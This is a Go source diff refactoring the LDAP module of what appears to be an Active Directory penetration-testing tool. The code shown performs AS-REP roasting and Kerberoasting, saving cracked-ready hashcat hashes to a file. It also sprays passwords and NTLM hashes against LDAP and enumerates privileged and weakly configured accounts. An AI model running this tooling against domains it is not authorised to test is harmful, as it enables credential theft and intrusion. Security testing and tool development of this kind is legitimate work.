@@ -59,10 +59,90 @@ type LdapOptions struct {
 	targets        []string
 	target2SMBInfo map[string]*smb.SMBInfo
 	filter         string
+	printMutex     sync.Mutex
 	credentials    []utils.Credential
 }
 
+func (o *LdapOptions) getFunction() func(string) {
+	if o.Hashes.AsrepRoast != "" {
+		return o.asreproast
+	}
+	if o.Hashes.Kerberoast != "" {
+		return o.kerberoast
+	}
+	if o.Enum.GetSID {
+		return o.domainSID
+	}
+	if o.Enum.TrustedForDelegation {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+			ldap.UACFilter(ldap.TRUSTED_FOR_DELEGATION),
+		)
+		return o.enumeration
+	}
+	if o.Enum.PasswordNotRequired {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+			ldap.UACFilter(ldap.PASSWD_NOTREQD),
+		)
+		return o.enumeration
+	}
+	if o.Enum.Users {
+		o.filter = ldap.FilterIsUser
+		return o.enumeration
+	}
+	if o.Enum.User != "" {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NewFilter(ldap.SAMAccountName, o.Enum.User),
+		)
+		return o.enumeration
+	}
+	if o.Enum.ActiveUsers {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+		)
+		return o.enumeration
+	}
+	if o.Enum.Groups {
+		o.filter = ldap.FilterIsGroup
+		return o.enumeration
+	}
+	if o.Enum.DCList {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsComputer,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+			ldap.UACFilter(ldap.SERVER_TRUST_ACCOUNT),
+		)
+		return o.enumeration
+	}
+	if o.Enum.PasswordNeverExpires {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+			ldap.UACFilter(ldap.DONT_EXPIRE_PASSWORD),
+		)
+		return o.enumeration
+	}
+	if o.Enum.AdminCount {
+		o.filter = ldap.JoinFilters(
+			ldap.FilterIsUser,
+			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+			ldap.FilterIsAdmin,
+		)
+		return o.enumeration
+	}
+	return nil
+}
+
 func (o *LdapOptions) Run() (err error) {
+	o.targets = utils.ExtractTargets(o.Targets.TARGETS)
+	o.target2SMBInfo = gatherSMBInfoToMap(&o.printMutex, o.targets, o.Connection.Port)
+	var f func(string) = o.getFunction()
+
 	if o.Connection.NTLM != "" {
 		o.credentials = utils.NewCredentialsNTLM(
 			utils.ExtractLinesFromFileOrString(o.Connection.Username),
@@ -75,98 +155,16 @@ func (o *LdapOptions) Run() (err error) {
 		)
 	}
 
-	o.targets = utils.ExtractTargets(o.Targets.TARGETS)
-	o.target2SMBInfo = make(map[string]*smb.SMBInfo)
+	if f == nil {
+		f = o.testCredentials
+	}
+
 	var wg sync.WaitGroup
-	var mutex sync.Mutex
-	for _, t := range o.targets {
-		wg.Add(1)
-		go func(s string) {
-			v := getSMBInfo(s)
-			if v != nil {
-				mutex.Lock()
-				o.target2SMBInfo[s] = v
-				mutex.Unlock()
-			}
-			wg.Done()
-
-		}(t)
-	}
-	wg.Wait()
-
-	var f func(string) error
-
-	if o.Hashes.AsrepRoast != "" {
-		f = o.asreproast
-	} else if o.Hashes.Kerberoast != "" {
-		f = o.kerberoast
-	} else if o.Enum.GetSID {
-		f = o.domainSID
-	} else if o.Enum.TrustedForDelegation {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.TRUSTED_FOR_DELEGATION),
-		)
-		f = o.enumeration
-	} else if o.Enum.PasswordNotRequired {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.PASSWD_NOTREQD),
-		)
-		f = o.enumeration
-	} else if o.Enum.Users {
-		o.filter = ldap.FilterIsUser
-		f = o.enumeration
-
-	} else if o.Enum.User != "" {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NewFilter(ldap.SAMAccountName, o.Enum.User),
-		)
-		f = o.enumeration
-	} else if o.Enum.ActiveUsers {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-		)
-		f = o.enumeration
-	} else if o.Enum.Groups {
-		o.filter = ldap.FilterIsGroup
-		f = o.enumeration
-	} else if o.Enum.DCList {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsComputer,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.SERVER_TRUST_ACCOUNT),
-		)
-		f = o.enumeration
-	} else if o.Enum.PasswordNeverExpires {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.UACFilter(ldap.DONT_EXPIRE_PASSWORD),
-		)
-		f = o.enumeration
-	} else if o.Enum.AdminCount {
-		o.filter = ldap.JoinFilters(
-			ldap.FilterIsUser,
-			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
-			ldap.FilterIsAdmin,
-		)
-		f = o.enumeration
-	} else {
-		return nil
-	}
-
 	for _, target := range o.targets {
 		wg.Add(1)
 		go func(t string) {
 			if ldap.IsLDAP(t, o.Connection.Port) {
-				if err := f(t); err != nil {
-					fmt.Println(err)
-				}
+				f(t)
 			}
 			wg.Done()
 		}(target)
@@ -175,21 +173,47 @@ func (o *LdapOptions) Run() (err error) {
 	return nil
 }
 
+func (o *LdapOptions) testCredentials(target string) {
+	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
+
+	prt := printer.NewPrinter("LDAP", lclient.Host, o.target2SMBInfo[lclient.Host].NetBIOSName, lclient.Port)
+	defer prt.PrintStored(&o.printMutex)
+
+	for _, creds := range o.credentials {
+		if creds.Hash != "" {
+			if err := lclient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
+				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
+			} else {
+				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
+			}
+		} else {
+			if err := lclient.Authenticate(creds.Username, creds.Password); err != nil {
+				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
+			} else {
+				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
+			}
+		}
+	}
+	prt.StoreFailure("no valid authentication")
+}
+
 func (o *LdapOptions) authenticate(ldapClient *ldap.LdapClient) (utils.Credential, error) {
 	prt := printer.NewPrinter("LDAP", ldapClient.Host, o.target2SMBInfo[ldapClient.Host].NetBIOSName, ldapClient.Port)
+	defer prt.PrintStored(&o.printMutex)
+
 	for _, creds := range o.credentials {
 		if creds.Hash != "" {
 			if err := ldapClient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
-				prt.PrintFailure(creds.StringWithDomain(o.Connection.Domain))
+				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
-				prt.PrintSuccess(creds.StringWithDomain(o.Connection.Domain))
+				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
 				return creds, nil
 			}
 		} else {
 			if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
-				prt.PrintFailure(creds.StringWithDomain(o.Connection.Domain))
+				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
-				prt.PrintSuccess(creds.StringWithDomain(o.Connection.Domain))
+				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
 				return creds, nil
 			}
 		}
@@ -197,7 +221,10 @@ func (o *LdapOptions) authenticate(ldapClient *ldap.LdapClient) (utils.Credentia
 	return utils.Credential{}, fmt.Errorf("no valid authentication")
 }
 
-func (o *LdapOptions) asreproast(target string) error {
+func (o *LdapOptions) asreproast(target string) {
+	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
+	defer prt.PrintStored(&o.printMutex)
+
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
@@ -207,16 +234,17 @@ func (o *LdapOptions) asreproast(target string) error {
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
 	creds, err := o.authenticate(lclient)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, lclient.Port)
 	var hashes []string
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
 		asrep, err := krb5client.GetAsReqTgt(obj.SAMAccountName)
@@ -224,19 +252,27 @@ func (o *LdapOptions) asreproast(target string) error {
 			return err
 		}
 		hash := kerberos.ASREPToHashcat(*asrep.Ticket)
-		prt.Print(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+		prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
 		hashes = append(hashes, hash)
 		return nil
 	})
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
-	prt.Print("Saving hashes to", o.Hashes.AsrepRoast)
-	return utils.WriteLines(hashes, o.Hashes.AsrepRoast)
+	prt.Store("Saving hashes to", o.Hashes.AsrepRoast)
+	err = utils.WriteLines(hashes, o.Hashes.AsrepRoast)
+	if err != nil {
+		prt.StoreFailure(err.Error())
+		return
+	}
 }
 
-func (o *LdapOptions) kerberoast(target string) error {
+func (o *LdapOptions) kerberoast(target string) {
+	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
+	defer prt.PrintStored(&o.printMutex)
+
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	ldapFilter := ldap.JoinFilters(
 		ldap.FilterIsUser,
@@ -246,16 +282,17 @@ func (o *LdapOptions) kerberoast(target string) error {
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
 	creds, err := o.authenticate(lclient)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, lclient.Port)
 	var hashes []string
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
 		if len(obj.ServicePrincipalName) == 0 {
@@ -269,7 +306,7 @@ func (o *LdapOptions) kerberoast(target string) error {
 			}
 
 			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
-			prt.Print(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+			prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
 
 			if i == 0 {
 				hashes = append(hashes, hash)
@@ -278,44 +315,59 @@ func (o *LdapOptions) kerberoast(target string) error {
 		return nil
 	})
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
-	prt.Print("Saving hashes to", o.Hashes.Kerberoast)
-	return utils.WriteLines(hashes, o.Hashes.Kerberoast)
+	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
+	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
+	if err != nil {
+		prt.StoreFailure(err.Error())
+		return
+	}
 }
 
-func (o *LdapOptions) enumeration(target string) error {
+func (o *LdapOptions) enumeration(target string) {
+	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
+	defer prt.PrintStored(&o.printMutex)
+
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	defer lclient.Close()
 
 	_, err := o.authenticate(lclient)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, lclient.Port)
-	return lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
-		prt.Print(obj.SAMAccountName, obj.Description)
+	err = lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
+		prt.Store(obj.SAMAccountName, obj.Description)
 		return err
 	})
+	if err != nil {
+		prt.StoreFailure(err.Error())
+		return
+	}
 }
 
-func (o *LdapOptions) domainSID(target string) error {
+func (o *LdapOptions) domainSID(target string) {
+	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
+	defer prt.PrintStored(&o.printMutex)
+
 	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
 	defer lclient.Close()
 
 	_, err := o.authenticate(lclient)
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
-	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, lclient.Port)
 	sid, err := lclient.GetDomainSID()
 	if err != nil {
-		return err
+		prt.StoreFailure(err.Error())
+		return
 	}
 
-	prt.Print(sid)
-	return nil
+	prt.Store(sid)
 }
